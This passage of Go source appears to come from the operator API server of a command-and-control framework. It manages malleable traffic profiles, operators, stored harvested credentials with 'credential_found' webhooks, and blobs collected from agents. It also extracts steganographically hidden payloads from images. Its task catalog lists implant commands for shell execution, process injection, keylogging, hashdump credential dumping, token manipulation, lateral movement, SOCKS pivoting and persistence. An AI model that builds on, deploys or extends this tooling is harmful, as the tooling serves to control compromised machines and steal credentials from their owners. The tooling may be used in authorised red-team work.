	if payloadLen > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("extracted length too large: %d", payloadLen)
	}

	requiredBytes := int(4+payloadLen) * 8
	if requiredBytes > len(imageData)-pixelStart {
		return nil, fmt.Errorf("image does not contain enough embedded data")
	}

	// Extract payload
	payload := make([]byte, payloadLen)
	for i := 0; i < int(payloadLen); i++ {
		var b byte
		for bit := 7; bit >= 0; bit-- {
			byteIdx := pixelStart + (i+4)*8 + (7 - bit)
			b |= (imageData[byteIdx] & 1) << uint(bit)
		}
		payload[i] = b
	}

	return payload, nil
}

// ===================== Profiles =====================

func (h *HTTPAPIServer) handleProfiles(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		profiles := h.profileManager.GetAllProfiles()
		var profileList []map[string]interface{}
		for _, p := range profiles {
			profileList = append(profileList, map[string]interface{}{
				"name":             p.Name,
				"user_agent":       p.UserAgent,
				"uris":             p.URIs,
				"body_transform":   p.BodyTransform,
				"request_headers":  p.RequestHeaders,
				"response_headers": p.ResponseHeaders,
			})
		}
		if profileList == nil {
			profileList = []map[string]interface{}{}
		}
		jsonResponse(w, map[string]interface{}{"profiles": profileList})

	case http.MethodPost:
		// Create/upload profile (same as /api/v1/profiles/upload)
		h.handleProfileUpload(w, r)

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) handleProfileUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Name            string            `json:"name"`
		UserAgent       string            `json:"user_agent"`
		URIs            []string          `json:"uris"`
		BodyTransform   string            `json:"body_transform"`
		RequestHeaders  map[string]string `json:"request_headers"`
		ResponseHeaders map[string]string `json:"response_headers"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}
	profile := &listener.MalleableProfile{
		Name:            req.Name,
		UserAgent:       req.UserAgent,
		URIs:            req.URIs,
		BodyTransform:   req.BodyTransform,
		RequestHeaders:  req.RequestHeaders,
		ResponseHeaders: req.ResponseHeaders,
	}
	if err := h.profileManager.SaveProfile(profile, "profiles"); err != nil {
		jsonError(w, fmt.Sprintf("failed to save profile: %v", err), http.StatusInternalServerError)
		return
	}
	jsonResponse(w, map[string]interface{}{"status": "ok", "name": profile.Name})
}

// handleProfileByName handles GET /api/v1/profiles/{name} and DELETE /api/v1/profiles/{name}.
func (h *HTTPAPIServer) handleProfileByName(w http.ResponseWriter, r *http.Request) {
	name := strings.TrimPrefix(r.URL.Path, "/api/v1/profiles/")
	if name == "" || name == "upload" {
		jsonError(w, "profile name required", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodGet:
		p, ok := h.profileManager.GetProfile(name)
		if !ok {
			jsonError(w, "profile not found", http.StatusNotFound)
			return
		}
		jsonResponse(w, map[string]interface{}{
			"name":             p.Name,
			"user_agent":       p.UserAgent,
			"uris":             p.URIs,
			"body_transform":   p.BodyTransform,
			"request_headers":  p.RequestHeaders,
			"response_headers": p.ResponseHeaders,
		})

	case http.MethodDelete:
		if err := h.profileManager.DeleteProfile(name); err != nil {
			jsonError(w, err.Error(), http.StatusBadRequest)
			return
		}
		log.Infof("Profile deleted: %s", name)
		jsonResponse(w, map[string]interface{}{"status": "ok", "name": name})

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ===================== Events =====================

func (h *HTTPAPIServer) handleEvents(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	limitStr := r.URL.Query().Get("limit")
	limit := 50
	if limitStr != "" {
		if parsed, err := strconv.Atoi(limitStr); err == nil && parsed > 0 {
			limit = parsed
		}
	}

	records, err := h.db.GetRecentAuditLog(limit)
	if err != nil {
		jsonError(w, "failed to get events", http.StatusInternalServerError)
		return
	}

	var events []map[string]interface{}
	for _, r := range records {
		events = append(events, map[string]interface{}{
			"action":      r.Action,
			"details":     r.Details,
			"timestamp":   r.Timestamp.Format("2006-01-02 15:04:05"),
			"operator_id": r.OperatorID,
		})
	}
	if events == nil {
		events = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"events": events})
}

// ===================== Server Info =====================

func (h *HTTPAPIServer) handleServerInfo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agents, _ := h.agentManager.GetAllAgents()
	listeners := h.listenerManager.GetAll()
	hostname, _ := os.Hostname()

	jsonResponse(w, map[string]interface{}{
		"version":         "0.7.0",
		"hostname":        hostname,
		"os":              runtime.GOOS,
		"agents_count":    len(agents),
		"listeners_count": len(listeners),
	})
}

func (h *HTTPAPIServer) handleOperators(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		// existing list logic below
	case http.MethodPost:
		h.createOperator(w, r)
		return
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	operators, err := h.db.GetAllOperators()
	if err != nil {
		jsonError(w, "failed to get operators", http.StatusInternalServerError)
		return
	}

	var opList []map[string]interface{}
	h.tokensMu.RLock()
	tokensCopy := make(map[string]tokenInfo, len(h.tokens))
	for k, v := range h.tokens {
		tokensCopy[k] = v
	}
	h.tokensMu.RUnlock()
	for _, op := range operators {
		online := false
		for _, info := range tokensCopy {
			if info.OperatorID == op.ID {
				online = true
				break
			}
		}
		entry := map[string]interface{}{
			"id":       op.ID,
			"username": op.Username,
			"role":     op.Role,
			"online":   online,
		}
		if !op.LastLogin.IsZero() {
			entry["last_login"] = op.LastLogin.Format("2006-01-02 15:04:05")
		}
		opList = append(opList, entry)
	}
	if opList == nil {
		opList = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"operators": opList})
}

// ===================== Task Catalog =====================

func (h *HTTPAPIServer) handleTaskCatalog(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	catalog := []map[string]interface{}{
		{"type": 1, "name": "shell", "desc": "Execute shell command", "params": []string{"(data=command)"}},
		{"type": 2, "name": "upload", "desc": "Upload file to agent", "params": []string{"path"}},
		{"type": 3, "name": "download", "desc": "Download file from agent", "params": []string{"(data=path)"}},
		{"type": 4, "name": "sleep", "desc": "Set sleep interval", "params": []string{"(data=seconds)", "jitter"}},
		{"type": 5, "name": "exit", "desc": "Graceful agent exit", "params": []string{}},
		{"type": 6, "name": "inject", "desc": "Process injection", "params": []string{"pid", "method", "tid", "dll", "func"}},
		{"type": 7, "name": "bof", "desc": "Execute Beacon Object File", "params": []string{"function", "args"}},
		{"type": 8, "name": "assembly", "desc": "Execute .NET assembly", "params": []string{"args"}},
		{"type": 9, "name": "screenshot", "desc": "Capture screenshot", "params": []string{}},
		{"type": 10, "name": "keylog", "desc": "Start/stop keylogger", "params": []string{"(data=start|stop|dump)"}},
		{"type": 11, "name": "ps", "desc": "List processes", "params": []string{}},
		{"type": 12, "name": "ls", "desc": "List directory", "params": []string{"(data=path)"}},
		{"type": 13, "name": "cd", "desc": "Change directory", "params": []string{"(data=path)"}},
		{"type": 14, "name": "pwd", "desc": "Get working directory", "params": []string{}},
		{"type": 15, "name": "whoami", "desc": "Get current user", "params": []string{}},
		{"type": 16, "name": "ipconfig", "desc": "Network configuration", "params": []string{}},
		{"type": 17, "name": "hashdump", "desc": "Dump credentials", "params": []string{"method"}},
		{"type": 18, "name": "token", "desc": "Token manipulation", "params": []string{"action", "pid", "user", "pass", "domain"}},
		{"type": 19, "name": "pivot", "desc": "Lateral movement", "params": []string{"method", "target", "extra"}},
		{"type": 20, "name": "portscan", "desc": "Port scanner", "params": []string{"ports", "timeout", "threads"}},
		{"type": 21, "name": "socks", "desc": "SOCKS5 proxy", "params": []string{"action", "port"}},
		{"type": 22, "name": "selfdestruct", "desc": "Agent self-destruct", "params": []string{}},
		{"type": 23, "name": "module", "desc": "Dynamic module execution", "params": []string{"action", "args"}},
		{"type": 24, "name": "clipboard", "desc": "Clipboard monitor", "params": []string{"(data=start|stop)"}},
		{"type": 25, "name": "regwrite", "desc": "Registry operations", "params": []string{"action"}},
		{"type": 26, "name": "service", "desc": "Service control", "params": []string{"action"}},
		{"type": 27, "name": "jobs", "desc": "Job management", "params": []string{"(data=list|kill <id>)"}},
		{"type": 28, "name": "persist", "desc": "Install persistence", "params": []string{"technique", "name", "path", "args", "hklm"}},
		{"type": 29, "name": "unpersist", "desc": "Remove persistence", "params": []string{"technique", "name", "path"}},
	}
	jsonResponse(w, map[string]interface{}{"catalog": catalog})
}

// ===================== Operator CRUD =====================

func (h *HTTPAPIServer) createOperator(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Role     string `json:"role"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if req.Username == "" || req.Password == "" {
		jsonError(w, "username and password are required", http.StatusBadRequest)
		return
	}

	// Validate role
	validRoles := map[string]bool{"admin": true, "operator": true, "viewer": true}
	if req.Role == "" {
		req.Role = "operator"
	}
	if !validRoles[req.Role] {
		jsonError(w, "invalid role: must be admin, operator, or viewer", http.StatusBadRequest)
		return
	}

	// Check if username already exists
	if h.db.OperatorExists(req.Username) {
		jsonError(w, "operator with this username already exists", http.StatusConflict)
		return
	}

	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		jsonError(w, "failed to hash password", http.StatusInternalServerError)
		return
	}

	id := uuid.New().String()[:8]
	record := &database.OperatorRecord{
		ID:           id,
		Username:     req.Username,
		PasswordHash: string(hash),
		Role:         req.Role,
	}

	if err := h.db.CreateOperator(record); err != nil {
		jsonError(w, fmt.Sprintf("failed to create operator: %v", err), http.StatusInternalServerError)
		return
	}

	log.Infof("Operator created via API: %s (role: %s)", req.Username, req.Role)
	_ = h.db.AuditLog("", "operator_create", id, fmt.Sprintf("Created operator %s with role %s", req.Username, req.Role))

	jsonResponse(w, map[string]interface{}{
		"id":       id,
		"username": req.Username,
		"role":     req.Role,
	})
}

func (h *HTTPAPIServer) handleOperatorByID(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/v1/operators/")
	if id == "" || id == "sessions" {
		jsonError(w, "operator ID required", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodGet:
		h.getOperator(w, id)
	case http.MethodPut:
		h.updateOperator(w, r, id)
	case http.MethodDelete:
		h.deleteOperator(w, r, id)
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) getOperator(w http.ResponseWriter, id string) {
	op, err := h.db.GetOperatorByID(id)
	if err != nil {
		jsonError(w, "operator not found", http.StatusNotFound)
		return
	}

	entry := map[string]interface{}{
		"id":       op.ID,
		"username": op.Username,
		"role":     op.Role,
	}
	if !op.LastLogin.IsZero() {
		entry["last_login"] = op.LastLogin.Format("2006-01-02 15:04:05")
	}
	jsonResponse(w, entry)
}

func (h *HTTPAPIServer) updateOperator(w http.ResponseWriter, r *http.Request, id string) {
	var req struct {
		Password string `json:"password"`
		Role     string `json:"role"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	// Verify the operator exists
	op, err := h.db.GetOperatorByID(id)
	if err != nil {
		jsonError(w, "operator not found", http.StatusNotFound)
		return
	}

	// Update password if provided
	if req.Password != "" {
		hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
		if err != nil {
			jsonError(w, "failed to hash password", http.StatusInternalServerError)
			return
		}
		if err := h.db.UpdateOperatorPassword(id, string(hash)); err != nil {
			jsonError(w, "failed to update password", http.StatusInternalServerError)
			return
		}
		log.Infof("Password updated for operator: %s", op.Username)
	}

	// Update role if provided
	if req.Role != "" {
		validRoles := map[string]bool{"admin": true, "operator": true, "viewer": true}
		if !validRoles[req.Role] {
			jsonError(w, "invalid role: must be admin, operator, or viewer", http.StatusBadRequest)
			return
		}
		if err := h.db.UpdateOperatorRole(id, req.Role); err != nil {
			jsonError(w, "failed to update role", http.StatusInternalServerError)
			return
		}
		log.Infof("Role updated for operator %s: %s -> %s", op.Username, op.Role, req.Role)

		// Update role in any active tokens for this operator
		h.tokensMu.Lock()
		for tok, info := range h.tokens {
			if info.OperatorID == id {
				info.Role = req.Role
				h.tokens[tok] = info
			}
		}
		h.tokensMu.Unlock()
	}

	_ = h.db.AuditLog("", "operator_update", id, fmt.Sprintf("Updated operator %s", op.Username))

	jsonResponse(w, map[string]interface{}{"status": "ok", "id": id})
}

func (h *HTTPAPIServer) deleteOperator(w http.ResponseWriter, r *http.Request, id string) {
	// Prevent self-deletion: check that the requesting operator is not the target
	token := r.Header.Get("Authorization")
	h.tokensMu.RLock()
	info, _ := h.tokens[token]
	h.tokensMu.RUnlock()

	if info.OperatorID == id {
		jsonError(w, "cannot delete your own account", http.StatusBadRequest)
		return
	}

	// Look up operator for audit log before deletion
	op, err := h.db.GetOperatorByID(id)
	if err != nil {
		jsonError(w, "operator not found", http.StatusNotFound)
		return
	}

	if err := h.db.DeleteOperator(id); err != nil {
		jsonError(w, fmt.Sprintf("failed to delete operator: %v", err), http.StatusInternalServerError)
		return
	}

	// Revoke all active sessions for the deleted operator
	h.tokensMu.Lock()
	for tok, tInfo := range h.tokens {
		if tInfo.OperatorID == id {
			delete(h.tokens, tok)
		}
	}
	h.tokensMu.Unlock()

	log.Infof("Operator deleted via API: %s (%s)", op.Username, id)
	_ = h.db.AuditLog(info.OperatorID, "operator_delete", id, fmt.Sprintf("Deleted operator %s", op.Username))

	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

func (h *HTTPAPIServer) handleOperatorSessions(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		h.listOperatorSessions(w)
	case http.MethodDelete:
		h.revokeOperatorSession(w, r)
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) listOperatorSessions(w http.ResponseWriter) {
	h.tokensMu.RLock()
	defer h.tokensMu.RUnlock()

	var sessions []map[string]interface{}
	for tok, info := range h.tokens {
		prefix := tok
		if len(prefix) > 8 {
			prefix = prefix[:8]
		}
		sessions = append(sessions, map[string]interface{}{
			"token_prefix": prefix,
			"operator_id":  info.OperatorID,
			"username":     info.Username,
			"role":         info.Role,
		})
	}
	if sessions == nil {
		sessions = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"sessions": sessions})
}

func (h *HTTPAPIServer) revokeOperatorSession(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if req.Token == "" {
		jsonError(w, "token is required", http.StatusBadRequest)
		return
	}

	h.tokensMu.Lock()
	_, exists := h.tokens[req.Token]
	if exists {
		delete(h.tokens, req.Token)
	}
	h.tokensMu.Unlock()

	if !exists {
		jsonError(w, "session not found", http.StatusNotFound)
		return
	}

	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Helpers =====================

func jsonResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

func jsonError(w http.ResponseWriter, message string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}

func agentToJSON(a *database.AgentRecord) map[string]interface{} {
	return map[string]interface{}{
		"id":             a.ID,
		"hostname":       a.Hostname,
		"username":       a.Username,
		"os":             a.OS,
		"arch":           a.Arch,
		"process_name":   a.ProcessName,
		"pid":            a.PID,
		"internal_ip":    a.InternalIP,
		"external_ip":    a.ExternalIP,
		"sleep_interval": a.SleepInterval,
		"jitter":         a.Jitter,
		"first_seen":     a.FirstSeen.Format("2006-01-02 15:04:05"),
		"last_seen":      a.LastSeen.Format("2006-01-02 15:04:05"),
		"listener_id":    a.ListenerID,
		"integrity":      a.Integrity,
		"alive":          a.Alive,
		"note":           a.Note,
	}
}

func taskToJSON(t *database.TaskRecord) map[string]interface{} {
	result := map[string]interface{}{
		"task_id":    t.ID,
		"agent_id":   t.AgentID,
		"type":       t.Type,
		"status":     t.Status,
		"created_at": t.CreatedAt.Format("2006-01-02 15:04:05"),
		"updated_at": t.UpdatedAt.Format("2006-01-02 15:04:05"),
	}
	if len(t.Output) > 0 {
		result["output"] = base64.StdEncoding.EncodeToString(t.Output)
	}
	return result
}

// ===================== Credentials =====================

func (h *HTTPAPIServer) handleCredentials(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		creds, err := h.db.GetCredentials()
		if err != nil {
			jsonError(w, "failed to get credentials", http.StatusInternalServerError)
			return
		}
		if creds == nil {
			creds = []map[string]interface{}{}
		}
		jsonResponse(w, map[string]interface{}{"credentials": creds})
	case http.MethodPost:
		var req struct {
			Type       string `json:"type"`
			Username   string `json:"username"`
			Domain     string `json:"domain"`
			Value      string `json:"value"`
			SourceID   string `json:"source_agent_id"`
			SourceHost string `json:"source_agent_hostname"`
			Note       string `json:"note"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			jsonError(w, "invalid request body", http.StatusBadRequest)
			return
		}
		id := uuid.New().String()[:8]
		cred := map[string]interface{}{
			"id":                    id,
			"type":                  req.Type,
			"username":              req.Username,
			"domain":                req.Domain,
			"value":                 req.Value,
			"source_agent_id":       req.SourceID,
			"source_agent_hostname": req.SourceHost,
			"note":                  req.Note,
		}
		if err := h.db.SaveCredential(cred); err != nil {
			jsonError(w, "failed to save credential", http.StatusInternalServerError)
			return
		}
		// Notify webhooks
		if h.webhookService != nil {
			go h.webhookService.NotifyEvent("credential_found", map[string]interface{}{
				"type": req.Type, "username": req.Username, "domain": req.Domain,
			})
		}
		// Notify WS clients
		if h.wsHub != nil {
			h.wsHub.Broadcast(WSEvent{Type: "credential_added", Data: cred})
		}
		jsonResponse(w, cred)
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) handleCredentialByID(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/v1/credentials/")
	if r.Method != http.MethodDelete {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := h.db.DeleteCredential(id); err != nil {
		jsonError(w, "failed to delete credential", http.StatusNotFound)
		return
	}
	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Agent Tags & Notes =====================

func (h *HTTPAPIServer) handleAllAgentTags(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tags, err := h.db.GetAllAgentTags()
	if err != nil {
		jsonError(w, "failed to get tags", http.StatusInternalServerError)
		return
	}
	jsonResponse(w, map[string]interface{}{"tags": tags})
}

func (h *HTTPAPIServer) handleAgentTags(w http.ResponseWriter, r *http.Request, agentID string) {
	switch r.Method {
	case http.MethodGet:
		tags, err := h.db.GetAgentTags(agentID)
		if err != nil {
			jsonError(w, "failed to get tags", http.StatusInternalServerError)
			return
		}
		if tags == nil {
			tags = []string{}
		}
		jsonResponse(w, map[string]interface{}{"agent_id": agentID, "tags": tags})

	case http.MethodPut:
		var req struct {
			Tags []string `json:"tags"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			jsonError(w, "invalid request body", http.StatusBadRequest)
			return
		}
		if err := h.db.SetAgentTags(agentID, req.Tags); err != nil {
			jsonError(w, "failed to set tags", http.StatusInternalServerError)
			return
		}
		jsonResponse(w, map[string]interface{}{"status": "ok", "tags": req.Tags})

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) handleAgentNote(w http.ResponseWriter, r *http.Request, agentID string) {
	if r.Method != http.MethodPut {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Note string `json:"note"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}
	if err := h.db.UpdateAgentNote(agentID, req.Note); err != nil {
		jsonError(w, "failed to update note", http.StatusInternalServerError)
		return
	}
	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Blob Storage =====================

func (h *HTTPAPIServer) handleBlobs(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	category := r.URL.Query().Get("category")
	agentID := r.URL.Query().Get("agent_id")
	blobs, err := h.blobStore.List(category, agentID)
	if err != nil {
		jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	jsonResponse(w, map[string]interface{}{"blobs": blobs, "count": len(blobs)})
}

func (h *HTTPAPIServer) handleBlobByID(w http.ResponseWriter, r *http.Request) {
	blobID := strings.TrimPrefix(r.URL.Path, "/api/v1/blobs/")
	if blobID == "" {
		jsonError(w, "blob ID required", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodGet:
		data, filename, err := h.blobStore.Retrieve(blobID)
		if err != nil {
			jsonError(w, err.Error(), http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Disposition", "attachment; filename=\""+filename+"\"")
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.Itoa(len(data)))
		w.Write(data)

	case http.MethodDelete:
		if err := h.blobStore.Delete(blobID); err != nil {
			jsonError(w, err.Error(), http.StatusNotFound)
			return
		}
		jsonResponse(w, map[string]interface{}{"status": "deleted", "blob_id": blobID})

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ===================== Audit Log =====================

func (h *HTTPAPIServer) handleAuditLog(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	q := r.URL.Query()
	operatorID := q.Get("operator")
	action := q.Get("action")
	sinceStr := q.Get("since")
	limitStr := q.Get("limit")
	offsetStr := q.Get("offset")

	var since time.Time
	if sinceStr != "" {
		since, _ = time.Parse(time.RFC3339, sinceStr)
	}
	limit := 100
	if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 1000 {
		limit = l
	}
	offset := 0
	if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
		offset = o
	}

	logs, err := h.db.QueryAuditLog(operatorID, action, since, limit, offset)
	if err != nil {
		jsonError(w, "failed to query audit log", http.StatusInternalServerError)
		return
	}
	jsonResponse(w, map[string]interface{}{"logs": logs, "count": len(logs)})
}
